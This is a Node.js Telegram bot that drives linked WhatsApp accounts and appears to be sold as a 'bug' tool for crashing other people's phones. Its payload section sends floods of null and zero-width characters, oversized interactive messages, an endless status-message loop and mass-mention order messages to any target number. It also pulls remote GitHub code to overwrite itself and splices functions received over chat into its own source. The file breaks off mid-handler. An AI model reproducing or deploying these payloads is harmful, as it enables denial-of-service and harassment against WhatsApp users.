const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const {
  default: makeWASocket,
  DisconnectReason,
  generateWAMessageFromContent,
  useMultiFileAuthState,
} = require("@denzz221/baileys");
const fs = require("fs");
const P = require("pino");
const crypto = require("crypto");
const path = require("path");
const axios = require("axios");
const { exec } = require("child_process");
const BOT_TOKEN = config.BOT_TOKEN;
const chalk = require("chalk");
const PREMIUM_FILE = "./database/premium.json";
const BLOCKED_COMMANDS_FILE = "./database/blocked_commands.json";
const BOT_MODE_FILE = "./database/bot_mode.json";
const GROUP_ONLY_FILE = "./database/group_only.json";

// Load blocked commands
function loadBlockedCommands() {
  try {
    if (!fs.existsSync(BLOCKED_COMMANDS_FILE)) {
      fs.writeFileSync(BLOCKED_COMMANDS_FILE, JSON.stringify([]));
      return [];
    }
    return JSON.parse(fs.readFileSync(BLOCKED_COMMANDS_FILE));
  } catch (error) {
    console.error("Error loading blocked commands:", error);
    return [];
  }
}

function saveBlockedCommands(commands) {
  try {
    fs.writeFileSync(BLOCKED_COMMANDS_FILE, JSON.stringify(commands, null, 2));
  } catch (error) {
    console.error("Error saving blocked commands:", error);
  }
}

// Load bot mode (on = maintenance / off = normal)
function loadBotMode() {
  try {
    if (!fs.existsSync(BOT_MODE_FILE)) {
      fs.writeFileSync(BOT_MODE_FILE, JSON.stringify({ mode: "off" }));
      return { mode: "off" };
    }
    return JSON.parse(fs.readFileSync(BOT_MODE_FILE));
  } catch (error) {
    console.error("Error loading bot mode:", error);
    return { mode: "off" };
  }
}

function saveBotMode(mode) {
  try {
    fs.writeFileSync(BOT_MODE_FILE, JSON.stringify({ mode: mode }));
  } catch (error) {
    console.error("Error saving bot mode:", error);
  }
}

// Load group only mode (on = only group / off = group + private)
function loadGroupOnly() {
  try {
    if (!fs.existsSync(GROUP_ONLY_FILE)) {
      fs.writeFileSync(GROUP_ONLY_FILE, JSON.stringify({ mode: "off" }));
      return { mode: "off" };
    }
    return JSON.parse(fs.readFileSync(GROUP_ONLY_FILE));
  } catch (error) {
    console.error("Error loading group only:", error);
    return { mode: "off" };
  }
}

function saveGroupOnly(mode) {
  try {
    fs.writeFileSync(GROUP_ONLY_FILE, JSON.stringify({ mode: mode }));
  } catch (error) {
    console.error("Error saving group only:", error);
  }
}

function loadPremiumUsers() {
  try {
    if (!fs.existsSync(PREMIUM_FILE)) {
      fs.writeFileSync(PREMIUM_FILE, JSON.stringify([]));
      return [];
    }
    return JSON.parse(fs.readFileSync(PREMIUM_FILE));
  } catch (error) {
    console.error("Error loading premium users:", error);
    return [];
  }
}

function savePremiumUsers(users) {
  try {
    fs.writeFileSync(PREMIUM_FILE, JSON.stringify(users, null, 2));
  } catch (error) {
    console.error("Error saving premium users:", error);
  }
}

async function getBuffer(url) {
  try {
    const res = await axios.get(url, { responseType: "arraybuffer" });
    return res.data;
  } catch (error) {
    console.error(error);
    throw new Error("Gagal mengambil data.");
  }
}

const sessions = new Map();
const activeProcesses = new Map();
const SESSIONS_DIR = "./sessions";
const ACTIVE_SESSIONS_FILE = "./sessions/active_sessions.json";
let blockedCommands = loadBlockedCommands();
let botMode = loadBotMode();
let groupOnly = loadGroupOnly();

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

function startBot() {
  console.log(chalk.red(`
hahahhaha yes bro tanks for buying 
`));
  console.log(chalk.red(`Happy For Bugging Men
`));
  console.log(chalk.blue(`
[ ⚡bot is running... ]
`));
}

function validateToken() {
  if (!BOT_TOKEN || BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") {
    console.error(chalk.red("Error: BOT_TOKEN tidak valid!"));
    process.exit(1);
  }
  startBot();
}

validateToken();

const getUptime = () => {
  const uptimeSeconds = process.uptime();
  const hours = Math.floor(uptimeSeconds / 3600);
  const minutes = Math.floor((uptimeSeconds % 3600) / 60);
  const seconds = Math.floor(uptimeSeconds % 60);
  return `${hours}h ${minutes}m ${seconds}s`;
};

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// Fungsi generate message ID
function generateMessageId() {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let result = '';
  for (let i = 0; i < 16; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

// Middleware untuk cek group only
function checkGroupOnlyMiddleware(ctx, next) {
  const groupOnlyMode = loadGroupOnly();
  const isOwnerUser = isOwner(ctx.from.id);
  
  if (groupOnlyMode.mode === "on" && ctx.chat.type === "private" && !isOwnerUser) {
    return;
  }
  return next();
}

// Middleware untuk cek bot mode (maintenance)
function checkBotModeMiddleware(ctx, next) {
  const botModeData = loadBotMode();
  const isOwnerUser = isOwner(ctx.from.id);
  
  if (botModeData.mode === "on" && !isOwnerUser) {
    return;
  }
  return next();
}

// Middleware untuk cek command blocked
function checkCommandBlocked(commandName, ctx) {
  const blocked = loadBlockedCommands();
  if (blocked.includes(commandName)) {
    return true;
  }
  return false;
}

// Fungsi untuk menyimpan sesi aktif
function saveActiveSession(botNumber) {
  try {
    let activeSessions = [];
    if (fs.existsSync(ACTIVE_SESSIONS_FILE)) {
      activeSessions = JSON.parse(fs.readFileSync(ACTIVE_SESSIONS_FILE));
    }
    if (!activeSessions.includes(botNumber)) {
      activeSessions.push(botNumber);
      fs.writeFileSync(ACTIVE_SESSIONS_FILE, JSON.stringify(activeSessions, null, 2));
    }
  } catch (error) {
    console.error("Error saving active session:", error);
  }
}

// Fungsi untuk menghapus sesi aktif
function removeActiveSession(botNumber) {
  try {
    if (fs.existsSync(ACTIVE_SESSIONS_FILE)) {
      let activeSessions = JSON.parse(fs.readFileSync(ACTIVE_SESSIONS_FILE));
      activeSessions = activeSessions.filter(num => num !== botNumber);
      fs.writeFileSync(ACTIVE_SESSIONS_FILE, JSON.stringify(activeSessions, null, 2));
    }
  } catch (error) {
    console.error("Error removing active session:", error);
  }
}

// Fungsi untuk memuat ulang semua sesi WhatsApp yang tersimpan
async function reloadAllWhatsAppSessions() {
  console.log(chalk.yellow("🔄 Memuat ulang sesi WhatsApp yang tersimpan..."));
  
  try {
    if (!fs.existsSync(SESSIONS_DIR)) {
      fs.mkdirSync(SESSIONS_DIR, { recursive: true });
      console.log(chalk.yellow("📁 Membuat direktori sessions..."));
      return;
    }

    let activeSessions = [];
    if (fs.existsSync(ACTIVE_SESSIONS_FILE)) {
      activeSessions = JSON.parse(fs.readFileSync(ACTIVE_SESSIONS_FILE));
    }

    if (activeSessions.length === 0) {
      console.log(chalk.yellow("Tidak ada sesi WhatsApp yang tersimpan."));
      return;
    }

    console.log(chalk.cyan(`📱 Ditemukan ${activeSessions.length} sesi WhatsApp yang tersimpan`));

    for (const botNumber of activeSessions) {
      console.log(chalk.yellow(`🔄 Menghubungkan kembali WhatsApp: ${botNumber}`));
      await reconnectWhatsApp(botNumber);
    }

    console.log(chalk.green(`✅ Berhasil memuat ulang ${sessions.size} sesi WhatsApp`));
  } catch (error) {
    console.error("Error reloading sessions:", error);
  }
}

// Fungsi untuk reconnect WhatsApp
async function reconnectWhatsApp(botNumber) {
  const sessionDir = SESSIONS_DIR;
  
  try {
    const credsPath = path.join(sessionDir, 'creds.json');
    if (!fs.existsSync(credsPath)) {
      console.log(chalk.red(`❌ File creds.json untuk ${botNumber} tidak ditemukan`));
      removeActiveSession(botNumber);
      return null;
    }

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    const sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: P({ level: "silent" }),
      defaultQueryTimeoutMs: undefined,
      keepAliveIntervalMs: 60000,
      connectTimeoutMs: 60000,
    });

    sock.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect } = update;

      if (connection === "close") {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        console.log(chalk.red(`❌ Koneksi WhatsApp ${botNumber} terputus:`, statusCode));
        
        if (statusCode !== DisconnectReason.loggedOut && statusCode !== 403) {
          console.log(chalk.yellow(`🔄 Mencoba reconnect ${botNumber} dalam 10 detik...`));
          setTimeout(() => reconnectWhatsApp(botNumber), 10000);
        } else if (statusCode === 403) {
          console.log(chalk.red(`🚫 WhatsApp ${botNumber} diblokir, hapus sesi`));
          removeActiveSession(botNumber);
        } else {
          console.log(chalk.red(`🚫 WhatsApp ${botNumber} logged out, hapus sesi`));
          removeActiveSession(botNumber);
        }
      } else if (connection === "open") {
        sessions.set(botNumber, sock);
        console.log(chalk.green(`✅ WhatsApp ${botNumber} berhasil terhubung kembali!`));
      } else if (connection === "connecting") {
        console.log(chalk.yellow(`⏳ Menghubungkan WhatsApp ${botNumber}...`));
      }
    });

    sock.ev.on("creds.update", saveCreds);
    
    return sock;
  } catch (error) {
    console.error(`Error reconnect WhatsApp ${botNumber}:`, error);
    return null;
  }
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `\`\`\`
╭─────────────────
│    MEMULAI    
│────────────────
│ Bot: ${botNumber}
│ Status: Inisialisasi...
╰─────────────────\`\`\``,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = SESSIONS_DIR;
  if (!fs.existsSync(sessionDir)) {
    fs.mkdirSync(sessionDir, { recursive: true });
  }

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
    keepAliveIntervalMs: 60000,
    connectTimeoutMs: 60000,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `\`\`\`
╭─────────────────
│    RECONNECTING    
│────────────────
│ Bot: ${botNumber}
│ Status: Mencoba menghubungkan...
╰─────────────────\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        setTimeout(() => connectToWhatsApp(botNumber, chatId), 10000);
      } else if (statusCode === DisconnectReason.loggedOut || statusCode === 403) {
        await bot.editMessageText(
          `\`\`\`
╭─────────────────
│    SESSION EXPIRED    
│────────────────
│ Bot: ${botNumber}
│ Status: Silakan /addbot ulang
╰─────────────────\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        removeActiveSession(botNumber);
        try {
          if (fs.existsSync(path.join(sessionDir, 'creds.json'))) {
            fs.unlinkSync(path.join(sessionDir, 'creds.json'));
          }
        } catch (error) {
          console.error("Error deleting creds:", error);
        }
      } else {
        await bot.editMessageText(
          `\`\`\`
╭─────────────────
│    KONEKSI GAGAL    
│────────────────
│ Bot: ${botNumber}
│ Status: Mencoba ulang...
╰─────────────────\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        setTimeout(() => connectToWhatsApp(botNumber, chatId), 15000);
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSession(botNumber);
      await bot.editMessageText(
        `\`\`\`
╭─────────────────
│    TERHUBUNG    
│────────────────
│ Bot: ${botNumber}
│ Status: Berhasil terhubung!
╰─────────────────\`\`\``,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await sleep(1000);
      try {
        if (!fs.existsSync(path.join(sessionDir, 'creds.json'))) {
          const code = await sock.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `\`\`\`
╭─────────────────
│    KODE PAIRING    
│────────────────
│ Bot: ${botNumber}
│ Kode: ${formattedCode}
╰─────────────────\`\`\``,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);
  return sock;
}

// ================= BUG FUNCTIONS (SEMUA DIKIRIM KE TARGET) ================= //

async function VsxCrashDelay(sock, target) {
  await sock.sendMessage(target, { text: "\u0000".repeat(900000) });
}

async function DelayHard(sock, target) {
  await sock.sendMessage(target, { text: "x".repeat(800000) });
}

async function StickerFC(sock, target) {
  await sock.sendMessage(target, { sticker: { url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true" } });
}

async function Freeze(sock, target) {
  await sock.relayMessage(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "FREEZE", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "cta_FREEZE",
            paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(500000)}\"}}`,
            version: 3
          }
        }
      }
    }
  }, { participant: { jid: target } });
}

async function invisfcmsg(sock, target) {
  await sock.sendMessage(target, { text: "\u200b".repeat(800000) });
}

async function VnXDelayXFcNew(sock, target) {
  await sock.relayMessage(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "VnX", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "cta_VnX",
            paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900009)}\"}}`,
            version: 3,
            contextInfo: {
              isForwarded: true,
              forwardingScore: 999,
              quotedMessage: {
                stickerMessage: {
                  url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
                  fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
                  fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
                  mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
                  mimetype: "image/webp",
                  directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
                  fileLength: "10610",
                  mediaKeyTimestamp: "1775044724",
                  stickerSentTs: "1775044724091"
                }
              }
            }
          }
        }
      }
    }
  }, { participant: { jid: target } });
}

async function delaynewinvisibleVnX(sock, target) {
  while (true) {
    try {
      const MsgNew = {
        groupStatusMessageV2: {
          message: {
            interactiveResponseMessage: {                     
              body: {
                text: "VnXNgelay",
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: "\u0000".repeat(400000),
                version: 3
              },
              entryPointConversionSource: "call_permission_request"
            }
          }
        }
      };

      await sock.relayMessage(target, MsgNew, { participant: { jid: target } });
      console.log(`✅ VnX Sent to ${target}`);
      await sleep(1200);
    } catch (e) {
      console.log("❌ Error:", e.message);
      await sleep(5000);
    }
  }
}

async function VisiNoob(sock, target) {
  for (let i = 0; i < 50; i++) {
    await sock.sendMessage(target, { text: "\u200e".repeat(600000) });
    await sleep(100);
  }
}

async function OrderSecret(sock, target) {
  const RuxzSecret = {
    orderMessage: {
      orderId: "4U7S4RWPS3C",
      itemCount: 99999999,
      status: "CANCELLED",
      surface: 2,
      sellerJid: "x",
      totalAmount1000: 99999999,
      currencyCodeIso4217: "IDR",
      orderValue: "Rp",
      contextInfo: {
        stanzaId: "3EB0F1A2B3C4D5E6",
        participant: target,
        quotedMessage: null,
        mentionedJid: Array.from({ length: 2090 }, (_, r) => `6285983729${r + 1}@s.whatsapp.net`)
      }
    }
  };

  for (let i = 0; i < 60; i++) {
    await sock.relayMessage(
      "status@broadcast",
      RuxzSecret,
      {
        messageId: generateMessageId(),
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined
                  }
                ]
              }
            ]
          }
        ]
      }
    );
    await new Promise(resolve => setTimeout(resolve, 1000));
  }
}

// ================= HELPER FUNCTIONS ================= //

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

function isPremium(userId) {
  try {
    const premiumUsers = loadPremiumUsers();
    return premiumUsers.includes(userId.toString());
  } catch (error) {
    console.error("Error checking premium status:", error);
    return false;
  }
}

// ================= FITUR UPDATE GITHUB ================= //

const GITHUB_RAW_URL = "https://raw.githubusercontent.com/sihalohoalexander389-oss/LINUXUPDATE/main/index.js";

async function checkGitHubUpdate() {
  try {
    const response = await axios.get(GITHUB_RAW_URL, { timeout: 10000 });
    const remoteContent = response.data;
    const localContent = fs.readFileSync(__filename, "utf8");
    
    if (remoteContent.trim() !== localContent.trim()) {
      return { hasUpdate: true, remoteContent: remoteContent };
    }
    return { hasUpdate: false, remoteContent: null };
  } catch (error) {
    console.error("Error checking GitHub update:", error);
    return { hasUpdate: false, remoteContent: null, error: error.message };
  }
}

async function performFullUpdate(chatId) {
  try {
    await bot.sendMessage(chatId, "🔄 Memeriksa update dari GitHub...");
    
    const updateCheck = await checkGitHubUpdate();
    
    if (!updateCheck.hasUpdate) {
      await bot.sendMessage(chatId, "✅ Tidak ada update tersedia. Bot sudah versi terbaru.");
      return false;
    }
    
    await bot.sendMessage(chatId, "📥 Update ditemukan! Mengunduh dan menginstal...");
    
    fs.writeFileSync(__filename, updateCheck.remoteContent);
    
    await bot.sendMessage(chatId, "🔄 Restarting bot... Mohon tunggu 5 detik.");
    
    setTimeout(() => {
      process.exit(0);
    }, 2000);
    
    return true;
  } catch (error) {
    console.error("Error performing full update:", error);
    await bot.sendMessage(chatId, `❌ Gagal update: ${error.message}`);
    return false;
  }
}

// ================= FITUR UPDATE CMD ================= //

async function updateCommandOnly(cmdName, loopCount, sleepMs) {
  try {
    let content = fs.readFileSync(__filename, "utf8");
    
    const commandRegex = new RegExp(`bot\\.onText\\(\\/\\/${cmdName}\\(\\?:\\s\\+(\\\\.+)\\)\\?/, async \\(msg, match\\) => \\{([\\s\\S]*?)for \\(let i = 0; i < (\\d+); i\\+\\+\\) \\{([\\s\\S]*?)\\n    \\}([\\s\\S]*?)\\n\\}\\);`, 'g');
    
    let matchFound = commandRegex.exec(content);
    if (!matchFound) {
      return false;
    }
    
    const oldLoopCount = matchFound[3];
    const loopBody = matchFound[4];
    
    const newLoopCode = `    for (let i = 0; i < ${loopCount}; i++) {${loopBody}    }`;
    
    const oldLoopRegex = new RegExp(`for \\(let i = 0; i < ${oldLoopCount}; i\\+\\+\\) \\{[\\s\\S]*?\\n    \\}`);
    const newContent = content.replace(oldLoopRegex, newLoopCode);
    
    fs.writeFileSync(__filename, newContent);
    return true;
  } catch (error) {
    console.error("Error updating command only:", error);
    return false;
  }
}

async function updateCommandWithNewFunction(cmdName, loopCount, sleepMs, functionBody, functionName) {
  try {
    let content = fs.readFileSync(__filename, "utf8");
    
    const existingFunctionCheck = new RegExp(`async function ${functionName}\\s*\\(`, 'g');
    if (!existingFunctionCheck.test(content)) {
      const bugFunctionsSection = "// ================= BUG FUNCTIONS (SEMUA DIKIRIM KE TARGET) ================= //";
      const insertPoint = content.indexOf(bugFunctionsSection);
      
      if (insertPoint !== -1) {
        const lines = content.split('\n');
        let lastFunctionLine = insertPoint;
        for (let i = insertPoint; i < lines.length; i++) {
          if (lines[i].startsWith('async function') || (lines[i].includes('async function') && lines[i].includes('{'))) {
            lastFunctionLine = i;
          }
          if (lines[i].includes('// ================= HELPER FUNCTIONS')) {
            break;
          }
        }
        
        const finalFunctionBody = functionBody.includes('async function') ? functionBody : `async ${functionBody}`;
        const functionCode = finalFunctionBody + '\n\n';
        lines.splice(lastFunctionLine + 1, 0, functionCode);
        content = lines.join('\n');
      }
    }
    
    const commandRegex = new RegExp(`bot\\.onText\\(\\/\\/${cmdName}\\(\\?:\\s\\+(\\\\.+)\\)\\?/, async \\(msg, match\\) => \\{([\\s\\S]*?)for \\(let i = 0; i < (\\d+); i\\+\\+\\) \\{([\\s\\S]*?)await ${functionName}\\(sock, target\\);([\\s\\S]*?)\\n    \\}([\\s\\S]*?)\\n\\}\\);`, 'g');
    
    let matchFound = commandRegex.exec(content);
    if (!matchFound) {
      return false;
    }
    
    const oldLoopCount = matchFound[3];
    const beforeAwait = matchFound[4];
    const afterAwait = matchFound[5];
    
    const newLoopCode = `    for (let i = 0; i < ${loopCount}; i++) {${beforeAwait}await ${functionName}(sock, target);${afterAwait}    }`;
    
    const oldLoopRegex = new RegExp(`for \\(let i = 0; i < ${oldLoopCount}; i\\+\\+\\) \\{[\\s\\S]*?\\n    \\}`);
    const newContent = content.replace(oldLoopRegex, newLoopCode);
    
    fs.writeFileSync(__filename, newContent);
    return true;
  } catch (error) {
    console.error("Error updating command with new function:", error);
    return false;
  }
}

bot.onText(/\/updatecmd (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    await bot.sendMessage(chatId, "❌ Hanya owner yang bisa menggunakan perintah ini.");
    return;
  }
  
  if (!match || !match[1]) {
    await bot.sendMessage(chatId, "❌ Format: /updatecmd <cmdName>,<loopCount>,<sleepMs>\n\nAtau reply file .js untuk update fungsi juga:\n/updatecmd <cmdName>,<loopCount>,<sleepMs>\n\nContoh: /updatecmd xspam,5,2000");
    return;
  }
  
  const args = match[1].split(',');
  if (args.length < 3) {
    await bot.sendMessage(chatId, "❌ Format: /updatecmd <cmdName>,<loopCount>,<sleepMs>");
    return;
  }
  
  const cmdName = args[0].trim().replace('/', '');
  const loopCount = parseInt(args[1].trim());
  const sleepMs = parseInt(args[2].trim());
  
  if (isNaN(loopCount) || isNaN(sleepMs)) {
    await bot.sendMessage(chatId, "❌ loopCount dan sleepMs harus berupa angka!");
    return;
  }
  
  const hasFileReply = msg.reply_to_message && msg.reply_to_message.document;
  
  if (hasFileReply) {
    const fileId = msg.reply_to_message.document.file_id;
    const fileName = msg.reply_to_message.document.file_name;
    
    if (!fileName.endsWith('.js')) {
      await bot.sendMessage(chatId, "❌ File harus berekstensi .js");
      return;
    }
    
    await bot.sendMessage(chatId, `🔄 Mengupdate command /${cmdName} dengan file ${fileName}...`);
    
    try {
      const fileLink = await bot.getFileLink(fileId);
      const response = await axios.get(fileLink, { responseType: 'text' });
      let functionBody = response.data.trim();
      
      const functionNameMatch = functionBody.match(/(?:async )?function\s+(\w+)\s*\(/);
      if (!functionNameMatch) {
        await bot.sendMessage(chatId, "❌ Tidak dapat menemukan nama fungsi di file!");
        return;
      }
      
      const functionName = functionNameMatch[1];
      
      if (!functionBody.includes('async function')) {
        functionBody = `async ${functionBody}`;
      }
      
      const success = await updateCommandWithNewFunction(cmdName, loopCount, sleepMs, functionBody, functionName);
      
      if (success) {
        await bot.sendMessage(chatId, `✅ BERHASIL UPDATE COMMAND /${cmdName} DENGAN FUNGSI BARU!
        
📌 Command: /${cmdName}
🔄 Loop: ${loopCount}x
⏱️ Sleep: ${sleepMs}ms
⚡ Function Baru: ${functionName}

🔄 Restarting bot dalam 3 detik...`);
        
        setTimeout(() => {
          process.exit(0);
        }, 3000);
      } else {
        await bot.sendMessage(chatId, `❌ Gagal mengupdate command /${cmdName}. Pastikan command tersebut ada dan dibuat dengan /addfunccmd.`);
      }
      
    } catch (error) {
      console.error("Error in updatecmd with file:", error);
      await bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    }
    
  } else {
    await bot.sendMessage(chatId, `🔄 Mengupdate command /${cmdName} (hanya loop & sleep)...`);
    
    const success = await updateCommandOnly(cmdName, loopCount, sleepMs);
    
    if (success) {
      await bot.sendMessage(chatId, `✅ BERHASIL UPDATE COMMAND /${cmdName}!
      
📌 Command: /${cmdName}
🔄 Loop: ${loopCount}x
⏱️ Sleep: ${sleepMs}ms

🔄 Restarting bot dalam 3 detik...`);
      
      setTimeout(() => {
        process.exit(0);
      }, 3000);
    } else {
      await bot.sendMessage(chatId, `❌ Gagal mengupdate command /${cmdName}. Pastikan command tersebut ada dan dibuat dengan /addfunccmd.`);
    }
  }
});

// ================= FITUR ADD FUNC CMD ================= //

async function addNewFunctionToFile(functionBody, functionName) {
  try {
    let content = fs.readFileSync(__filename, "utf8");
    
    const bugFunctionsSection = "// ================= BUG FUNCTIONS (SEMUA DIKIRIM KE TARGET) ================= //";
    const insertPoint = content.indexOf(bugFunctionsSection);
    
    if (insertPoint === -1) {
      return false;
    }
    
    const existingFunctionCheck = new RegExp(`async function ${functionName}\\s*\\(`, 'g');
    if (existingFunctionCheck.test(content)) {
      return true;
    }
    
    const lines = content.split('\n');
    let lastFunctionLine = insertPoint;
    for (let i = insertPoint; i < lines.length; i++) {
      if (lines[i].startsWith('async function') || (lines[i].includes('async function') && lines[i].includes('{'))) {
        lastFunctionLine = i;
      }
      if (lines[i].includes('// ================= HELPER FUNCTIONS')) {
        break;
      }
    }
    
    const finalFunctionBody = functionBody.includes('async function') ? functionBody : `async ${functionBody}`;
    const functionCode = finalFunctionBody + '\n\n';
    lines.splice(lastFunctionLine + 1, 0, functionCode);
    
    fs.writeFileSync(__filename, lines.join('\n'));
    return true;
  } catch (error) {
    console.error("Error adding new function:", error);
    return false;
  }
}

async function addNewCommand(cmdName, loopCount, sleepMs, functionName) {
  try {
    let content = fs.readFileSync(__filename, "utf8");
    
    const commandTemplate = `
bot.onText(/\\/${cmdName}(?:\\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const botModeData = loadBotMode();
  const groupOnlyData = loadGroupOnly();
  
  if (botModeData.mode === "on" && !isOwner(userId)) {
    return;
  }
  
  if (groupOnlyData.mode === "on" && msg.chat.type === "private" && !isOwner(userId)) {
    return;
  }
  
  if (checkCommandBlocked("${cmdName}", msg)) {
    return;
  }
  
  if (!isOwner(userId) && !isPremium(userId)) {
    return;
  }

  if (!match[1]) {
    return;
  }

  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = \`\${formattedNumber}@s.whatsapp.net\`;

  try {
    if (sessions.size === 0) {
      return;
    }

    const sock = sessions.values().next().value;
    
    await bot.sendMessage(chatId, \`✅ ${cmdName} (bug) selesai untuk \${formattedNumber}\`, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "📱 CEK TARGET", url: \`https://wa.me/\${formattedNumber}\` }]
        ]
      }
    });
    
    for (let i = 0; i < ${loopCount}; i++) {
      await ${functionName}(sock, target);
      await sleep(${sleepMs});
      console.log(chalk.green(\`✅ Success Sending to \${target}\`));
    }
    
  } catch (error) {
    console.error("Error in ${cmdName}:", error);
  }
});`;

    const menuButtonSection = "const mainMenuButtons = {";
    const insertPoint = content.indexOf(menuButtonSection);
    
    if (insertPoint === -1) {
      return false;
    }
    
    const lines = content.split('\n');
    lines.splice(insertPoint, 0, commandTemplate);
    
    fs.writeFileSync(__filename, lines.join('\n'));
    
    let newContent = fs.readFileSync(__filename, "utf8");
    const menuTextOld = newContent.match(/const menuText = `([\\s\\S]*?)`;/);
    if (menuTextOld) {
      let newMenuText = menuTextOld[1];
      const cmdLine = `│ ❀ /${cmdName} <number> - custom bug\n`;
      const insertMenuPoint = newMenuText.indexOf('╰═════════════════❀');
      if (insertMenuPoint !== -1) {
        newMenuText = newMenuText.slice(0, insertMenuPoint) + cmdLine + newMenuText.slice(insertMenuPoint);
        const newContent2 = newContent.replace(menuTextOld[0], `const menuText = \`${newMenuText}\`;`);
        fs.writeFileSync(__filename, newContent2);
      }
    }
    
    return true;
  } catch (error) {
    console.error("Error adding new command:", error);
    return false;
  }
}

// Fitur /addfunccmd dengan dukungan reply file ATAU langsung teks
bot.onText(/\/addfunccmd(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    await bot.sendMessage(chatId, "❌ Hanya owner yang bisa menggunakan perintah ini.");
    return;
  }
  
  if (!match || !match[1]) {
    await bot.sendMessage(chatId, "❌ Format: /addfunccmd <cmdName>,<loopCount>,<sleepMs>,<functionName>\n\nCara 1 (Reply file .js):\nKirim file .js, lalu reply file tersebut dengan perintah ini.\n\nCara 2 (Reply teks):\nKirim fungsi sebagai teks, lalu reply pesan fungsi tersebut dengan perintah ini.\n\nContoh: /addfunccmd xspam,3,1000,DelayKelrax");
    return;
  }
  
  const args = match[1].split(',');
  if (args.length < 4) {
    await bot.sendMessage(chatId, "❌ Format: /addfunccmd <cmdName>,<loopCount>,<sleepMs>,<functionName>\n\nContoh: /addfunccmd xspam,3,1000,DelayKelrax");
    return;
  }
  
  const cmdName = args[0].trim().replace('/', '');
  const loopCount = parseInt(args[1].trim());
  const sleepMs = parseInt(args[2].trim());
  const functionName = args[3].trim();
  
  if (isNaN(loopCount) || isNaN(sleepMs)) {
    await bot.sendMessage(chatId, "❌ loopCount dan sleepMs harus berupa angka!");
    return;
  }
  
  let functionBody = null;
  let source = "";
  
  if (msg.reply_to_message) {
    if (msg.reply_to_message.document) {
